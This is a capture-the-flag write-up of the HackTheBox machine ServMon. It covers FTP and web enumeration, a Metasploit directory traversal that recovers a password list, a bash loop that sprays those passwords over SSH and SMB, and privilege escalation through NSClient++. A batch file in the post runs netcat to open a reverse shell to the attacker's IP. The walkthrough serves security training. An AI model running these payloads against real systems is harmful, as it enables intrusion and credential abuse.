---
layout: post
title:  ServMon
categories: hackthebox
tags: [hackthebox, windows, easy, ssh, ftp, nvms-1000, nsclient++, dmw0ng]
lang: "en"
image:
    path: assets/images/hackthebox/servmon/preview.png
    width: 300
    height: 300
...

![ServMon](../../../../assets/images/hackthebox/servmon/servmon.jpg)

# abstract

ServMon is a box rated as easy and created by dmw0ng. To master the box you need a little patience when trying out the found credentials.
Once you have the credentials and an account, you create a SSH tunnel and configure the NSClient++ software to run netcat as administrator.

# enumeration

## nmap

As always first the nmap scan.

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 07:04 EDT
Nmap scan report for servmon.htb (10.10.10.184)
Host is up (0.033s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesnt have a title (text/html).
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     ts).
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/18%Time=5E9ADED6%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/18%Time=5E9ADEDF%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0ts\)\.\0\0\0\0\0\0\0\0\x04
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xc7\x10\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1
SF:\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r
SF:(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocum
SF:ent\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Leng
SF:th:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m49s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-18T11:10:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.29 seconds
```

There are some ports open, one after the other I start with port 21 ftp.

## ftp enumeration

The ftp client of kali shows several folders, so I download the whole directory with wget to browse it offline.

```bash
kali@kali:~$ wget -r ftp://anonymous:anonymous@servmon.htb/
...
kali@kali:~$ tree servmon.htb/
servmon.htb/
└── Users
    ├── Nadine
    │   └── Confidential.txt
    └── Nathan
        └── Notes to do.txt

3 directories, 2 files
```

A note that the user Nadine left a file named Password.txt on the desktop of the user Nathan.

```
kali@kali:~$ cat servmon.htb/Users/Nadine/Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

Another note, apparently Nathan hasn't done anything with the passwords yet.

```
kali@kali:~$ cat servmon.htb/Users/Nathan/Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

There seems to be nothing more to be found on the FTP server, then move on to port 80.

## web enumeration

A login page of a tool called nvms-1000 appears.

![NVMS](../../../../assets/images/hackthebox/servmon/0_servmon.htb.png)

Actually I try to avoid using Metasploit as much as possible, but here everything is already done and the exploit is not very complicated.

# exploitation

```bash
msf5 > search nvms

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
   
msf5 > use auxiliary/scanner/http/tvt_nvms_traversal
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > show options

Module options (auxiliary/scanner/http/tvt_nvms_traversal):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   DEPTH      13                yes       Depth for Path Traversal
   FILEPATH   /windows/win.ini  yes       The path to the file to read
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                 yes       The base URI path of nvms
   THREADS    1                 yes       The number of concurrent threads (max one per host)
   VHOST                        no        HTTP server virtual host

msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts servmon.htb
rhosts => servmon.htb
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set filepath /users/nathan/desktop/passwords.txt
filepath => /users/nathan/desktop/passwords.txt
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /home/kali/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It works.

```
kali@kali:~$ cat /home/kali/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

So this is the list of passwords, unfortunately there are no usernames for them. 
The first step was to try to login to the website. So far I only know the usernames nathan and nadine.
I added the admin account to these two users and tried all combinations.

Unfortunately without success. After that I built a small script which tried the other services. For the SSH server I used sshpass, because I could send the password directly.

```bash
array=( nathan nadine )

for user in "${array[@]}"
do
	for line in $(cat passwords.txt)
	do
		echo "check $user with password: $line" 
		rpcclient -U "$user%$line" servmon.htb
		sshpass -p $line ssh $user@servmon.htb
	done
done
```

```
kali@kali:~/hacking_stuff/htb/machines/servmon$ ./script.sh
check nathan with password: 1nsp3ctTh3Way2Mars!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: Th3r34r3To0M4nyTrait0r5!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: B3WithM30r4ga1n5tMe
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: L1k3B1gBut7s@W0rk
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: 0nly7h3y0unGWi11F0l10w
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: IfH3s4b0Utg0t0H1sH0me
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nathan with password: Gr4etN3w5w17hMySk1Pa5$
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nadine with password: 1nsp3ctTh3Way2Mars!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nadine with password: Th3r34r3To0M4nyTrait0r5!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nadine with password: B3WithM30r4ga1n5tMe
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Permission denied, please try again.
check nadine with password: L1k3B1gBut7s@W0rk
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

Valid SSH Creds: nadine L1k3B1gBut7s@W0rk

```powershell
nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
cf2f8de4bc----------------------
```

# Privilege Escalation

## emumeration

On Windows machines it always makes sense to check what is installed and in this case there is a tool that is not installed by default. NSClient++


```powershell
nadine@SERVMON C:\>dir "Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Program Files

08/04/2020  23:21    <DIR>          .
08/04/2020  23:21    <DIR>          ..
08/04/2020  23:21    <DIR>          Common Files
08/04/2020  23:18    <DIR>          Internet Explorer
19/03/2019  05:52    <DIR>          ModifiableWindowsApps
16/01/2020  19:11    <DIR>          NSClient++
08/04/2020  23:09    <DIR>          Reference Assemblies
08/04/2020  23:21    <DIR>          UNP
14/01/2020  09:14    <DIR>          VMware
08/04/2020  22:31    <DIR>          Windows Defender
08/04/2020  22:45    <DIR>          Windows Defender Advanced Threat Protection
19/03/2019  05:52    <DIR>          Windows Mail
19/03/2019  12:43    <DIR>          Windows Multimedia Platform
19/03/2019  06:02    <DIR>          Windows NT
19/03/2019  12:43    <DIR>          Windows Photo Viewer
19/03/2019  12:43    <DIR>          Windows Portable Devices
19/03/2019  05:52    <DIR>          Windows Security
19/03/2019  05:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              18 Dir(s)  27,852,365,824 bytes free
```

A quick search on [Exploit-DB.com](https://www.exploit-db.com/exploits/46802) provides a way to extend our rights.

First I had to check if all necessary information is available.

```powershell              
nadine@SERVMON C:\Program Files\NSClient++>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Program Files\NSClient++

16/01/2020  19:11    <DIR>          .
16/01/2020  19:11    <DIR>          ..
09/12/2015  01:17            28,672 boost_chrono-vc110-mt-1_58.dll
09/12/2015  01:17            50,688 boost_date_time-vc110-mt-1_58.dll
09/12/2015  01:17           117,760 boost_filesystem-vc110-mt-1_58.dll
09/12/2015  01:22           439,296 boost_program_options-vc110-mt-1_58.dll
09/12/2015  01:23           256,000 boost_python-vc110-mt-1_58.dll
09/12/2015  01:17           765,952 boost_regex-vc110-mt-1_58.dll
09/12/2015  01:16            19,456 boost_system-vc110-mt-1_58.dll
09/12/2015  01:18           102,400 boost_thread-vc110-mt-1_58.dll
14/01/2020  14:24                51 boot.ini
18/01/2018  16:51           157,453 changelog.txt
28/01/2018  23:33         1,210,392 check_nrpe.exe
08/04/2020  10:48    <DIR>          crash-dumps
05/11/2017  22:09           318,464 Google.ProtocolBuffers.dll
09/12/2015  00:16         1,655,808 libeay32.dll
05/11/2017  23:04            18,351 license.txt
05/10/2017  08:19           203,264 lua.dll
14/01/2020  14:24    <DIR>          modules
10/04/2020  19:32             2,683 nsclient.ini
20/06/2020  00:52            29,410 nsclient.log
05/11/2017  22:42            55,808 NSCP.Core.dll
28/01/2018  23:32         4,765,208 nscp.exe
05/11/2017  22:42           483,328 NSCP.Protobuf.dll
19/11/2017  17:18           534,016 nscp_json_pb.dll
19/11/2017  16:55         2,090,496 nscp_lua_pb.dll
23/01/2018  21:57           507,904 nscp_mongoose.dll
19/11/2017  16:49         2,658,304 nscp_protobuf.dll
05/11/2017  23:04             3,921 old-settings.map
28/01/2018  23:21         1,973,760 plugin_api.dll
23/05/2015  09:44         3,017,216 python27.dll
27/09/2015  16:42        28,923,515 python27.zip
28/01/2018  23:34           384,536 reporter.exe
14/01/2020  14:24    <DIR>          scripts
14/01/2020  14:24    <DIR>          security
09/12/2015  00:16           348,160 ssleay32.dll
23/05/2015  09:44           689,664 unicodedata.pyd
14/01/2020  14:24    <DIR>          web
05/11/2017  22:20         1,273,856 where_filter.dll
23/05/2015  09:44            47,616 _socket.pyd
              33 File(s)     53,133,408 bytes
               7 Dir(s)  27,852,365,824 bytes free
```

The nsclient.ini can be read. Here is a section of the most important lines:

```powershell
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:        
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help
                                                
; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...
```

## NSClient++

The service has a binding to 127.0.0.1 and only allows access from this host. So first I build a SSH tunnel.

```bash
kali@kali:~/hacking_stuff/htb/machines/servmon$ ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb
nadine@servmon.htb''s password:                                                   
Microsoft Windows [Version 10.0.18363.752]                                  
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

![ssh tunnel](../../../../assets/images/hackthebox/servmon/1_ssh_tunnel.png)

Ok, we are in.

![nsclient](../../../../assets/images/hackthebox/servmon/2_nsclient.png)

Now we need a little script that calls netcat for us.

```batch
@echo off
C:\Temp\nc.exe 10.10.14.18 1337 -e cmd.exe
```

The batch file and the netcat exe must be on the server, it is important to use the correct architecture.

```bash
kali@kali:~/hacking_stuff/htb/machines/servmon$ scp ../../../useful/nc/nc64.exe nadine@servmon.htb:C:/Temp/nc.exe
nadine@servmon.htb''s password: 
nc64.exe                                                                            100%   43KB 297.2KB/s   00:00
kali@kali:~/hacking_stuff/htb/machines/servmon$ scp evil.bat nadine@servmon.htb:C:/Temp/
nadine@servmon.htb''s password: 
evil.bat
```

In the next step the NSClient++ must be set up to execute the batch file, but before that a listener must be set up locally.

![nsclient_exploit](../../../../assets/images/hackthebox/servmon/3_3_config.png)

The software itself doesn't seem to run very stable and so you have to refresh it from time to time or click the Queries button several times.

![root_shell](../../../../assets/images/hackthebox/servmon/4_root.png)

```powershell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
dff8079d96----------------------
```

That's it, a root shell.